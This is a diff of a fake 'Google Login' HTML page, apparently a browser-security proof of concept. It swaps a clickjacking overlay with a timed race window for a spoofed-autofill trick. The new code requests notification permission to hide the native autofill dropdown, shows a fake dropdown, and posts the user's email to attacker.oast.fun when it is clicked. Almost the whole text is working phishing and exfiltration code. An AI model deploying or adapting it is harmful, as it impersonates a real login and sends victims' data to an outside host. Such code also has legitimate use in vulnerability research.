@@ -4,84 +4,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Google Login</title>
   <style>
-    body {
-      margin: 0;
-      font-family: sans-serif;
-    }
-    .real-content {
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-    }
-    #realButton {
-      padding: 15px 30px;
-      font-size: 18px;
-      background: #1a73e8;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      z-index: 1;
-    }
-
-    .overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(255,255,255,0.9);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 2;
-      pointer-events: none;
-    }
-
-    .fake-dialog {
-      background: white;
-      border: 1px solid #ccc;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-      font-size: 16px;
-      text-align: center;
-    }
-
-    .fake-dialog button {
-      margin-top: 15px;
-      padding: 10px 20px;
-      background: #aaa;
-      color: white;
-      border: none;
-      border-radius: 5px;
-    }
-  </style>
-</head>
 <body>
 
-<div class="real-content">
-  <h2>Continue to Google</h2>
-  <button id="realButton" onclick="alert('You clicked real Google login')">Sign in with Google</button>
-</div>
-
-<div class="overlay" id="overlay">
-  <div class="fake-dialog">
-    <p>Authorizing with Google...</p>
-    <button disabled>🔄 Processing...</button>
-  </div>
-</div>
-
+<input type="email" id="email" autocomplete="email" />
+<div id="fakeDropdown"> <!-- spoofed autofill entries --> </div>
 <script>
-  // Initial state: overlay is present but not intercepting clicks
-  const overlay = document.getElementById("overlay");
-  overlay.style.pointerEvents = "none";
+  email.onfocus = () => {
+    setTimeout(() => {
+      Notification.requestPermission(); // Suppress native autofill dropdown
+      fakeDropdown.style.display = 'block';
+    }, 150);
+  };
 
-  // After 2 seconds, enable pointer-events to capture user tap
-  setTimeout(() => {
-    overlay.style.pointerEvents = "auto";
-  }, 2000); // Race window — adjust this as needed
+  fakeDropdown.onclick = () => {
+    setTimeout(() => {
+      fetch('https://attacker.oast.fun', {
+        method: 'POST',
+        body: JSON.stringify({ email: email.value })
+      });
+    }, 500); // cukup waktu autofill berjalan
+  };
 </script>
+
 
 </body>
 </html>
